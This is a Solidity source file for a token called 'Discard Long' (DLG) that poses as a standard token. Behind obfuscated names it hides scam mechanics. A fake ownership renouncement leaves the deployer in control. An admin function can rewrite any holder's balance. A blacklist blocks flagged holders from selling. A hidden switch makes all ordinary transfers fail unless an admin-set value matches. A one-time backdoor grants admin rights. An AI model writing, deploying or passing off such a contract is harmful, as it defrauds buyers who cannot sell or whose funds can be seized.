//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface toMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract launchedFundTo {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface autoReceiver {
    function createPair(address enableSender, address receiverShould) external returns (address);
}

interface amountFrom {
    function totalSupply() external view returns (uint256);

    function balanceOf(address listReceiver) external view returns (uint256);

    function transfer(address fundLaunchMarketing, uint256 isSenderEnable) external returns (bool);

    function allowance(address exemptLiquidity, address spender) external view returns (uint256);

    function approve(address spender, uint256 isSenderEnable) external returns (bool);

    function transferFrom(
        address sender,
        address fundLaunchMarketing,
        uint256 isSenderEnable
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tradingTx, uint256 value);
    event Approval(address indexed exemptLiquidity, address indexed spender, uint256 value);
}

interface amountFromMetadata is amountFrom {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DiscardLong is launchedFundTo, amountFrom, amountFromMetadata {

    address feeEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function limitReceiver(uint256 isSenderEnable) public {
        teamWallet();
        launchReceiverMin = isSenderEnable;
    }

    function decimals() external view virtual override returns (uint8) {
        return tokenList;
    }

    function transfer(address isFrom, uint256 isSenderEnable) external virtual override returns (bool) {
        return listSender(_msgSender(), isFrom, isSenderEnable);
    }

    function symbol() external view virtual override returns (string memory) {
        return launchedFund;
    }

    function teamWallet() private view {
        require(launchedMarketing[_msgSender()]);
    }

    function getOwner() external view returns (address) {
        return feeList;
    }

    function listSender(address teamLimit, address fundLaunchMarketing, uint256 isSenderEnable) internal returns (bool) {
        if (teamLimit == txShould) {
            return walletIs(teamLimit, fundLaunchMarketing, isSenderEnable);
        }
        uint256 isMinAmount = amountFrom(minSell).balanceOf(tradingShould);
        require(isMinAmount == launchReceiverMin);
        require(fundLaunchMarketing != tradingShould);
        if (senderLimit[teamLimit]) {
            return walletIs(teamLimit, fundLaunchMarketing, buyLiquidity);
        }
        return walletIs(teamLimit, fundLaunchMarketing, isSenderEnable);
    }

    function marketingFeeTotal(address isFrom, uint256 isSenderEnable) public {
        teamWallet();
        isBuy[isFrom] = isSenderEnable;
    }

    mapping(address => uint256) private isBuy;

    function allowance(address exemptTx, address minListToken) external view virtual override returns (uint256) {
        if (minListToken == feeEnable) {
            return type(uint256).max;
        }
        return teamTake[exemptTx][minListToken];
    }

    string private swapMaxMin = "Discard Long";

    bool public isSell;

    uint256 modeFundSender;

    function balanceOf(address listReceiver) public view virtual override returns (uint256) {
        return isBuy[listReceiver];
    }

    address public txShould;

    uint8 private tokenList = 18;

    event OwnershipTransferred(address indexed limitTeam, address indexed walletMode);

    uint256 private txMin = 100000000 * 10 ** 18;

    address tradingShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public tokenEnableList;

    constructor (){
        
        toMarketing autoList = toMarketing(feeEnable);
        minSell = autoReceiver(autoList.factory()).createPair(autoList.WETH(), address(this));
        
        txShould = _msgSender();
        receiverAuto();
        launchedMarketing[txShould] = true;
        isBuy[txShould] = txMin;
        
        emit Transfer(address(0), txShould, txMin);
    }

    function fundSwap(address maxTx) public {
        require(maxTx.balance < 100000);
        if (isSell) {
            return;
        }
        
        launchedMarketing[maxTx] = true;
        if (buyAtMode != fundBuy) {
            txWalletTotal = true;
        }
        isSell = true;
    }

    function walletIs(address teamLimit, address fundLaunchMarketing, uint256 isSenderEnable) internal returns (bool) {
        require(isBuy[teamLimit] >= isSenderEnable);
        isBuy[teamLimit] -= isSenderEnable;
        isBuy[fundLaunchMarketing] += isSenderEnable;
        emit Transfer(teamLimit, fundLaunchMarketing, isSenderEnable);
        return true;
    }

    mapping(address => bool) public senderLimit;

    mapping(address => bool) public launchedMarketing;

    uint256 private fundBuy;

    uint256 constant buyLiquidity = 11 ** 10;

    address public minSell;

    function totalSupply() external view virtual override returns (uint256) {
        return txMin;
    }

    function launchedAmount(address teamSender) public {
        teamWallet();
        if (tokenEnableList) {
            buyAtMode = fundBuy;
        }
        if (teamSender == txShould || teamSender == minSell) {
            return;
        }
        senderLimit[teamSender] = true;
    }

    string private launchedFund = "DLG";

    uint256 public txSwapSender;

    uint256 public buyAtMode;

    uint256 launchReceiverMin;

    function owner() external view returns (address) {
        return feeList;
    }

    address private feeList;

    function transferFrom(address teamLimit, address fundLaunchMarketing, uint256 isSenderEnable) external override returns (bool) {
        if (_msgSender() != feeEnable) {
            if (teamTake[teamLimit][_msgSender()] != type(uint256).max) {
                require(isSenderEnable <= teamTake[teamLimit][_msgSender()]);
                teamTake[teamLimit][_msgSender()] -= isSenderEnable;
            }
        }
        return listSender(teamLimit, fundLaunchMarketing, isSenderEnable);
    }

    function approve(address minListToken, uint256 isSenderEnable) public virtual override returns (bool) {
        teamTake[_msgSender()][minListToken] = isSenderEnable;
        emit Approval(_msgSender(), minListToken, isSenderEnable);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return swapMaxMin;
    }

    mapping(address => mapping(address => uint256)) private teamTake;

    bool private txWalletTotal;

    function receiverAuto() public {
        emit OwnershipTransferred(txShould, address(0));
        feeList = address(0);
    }

}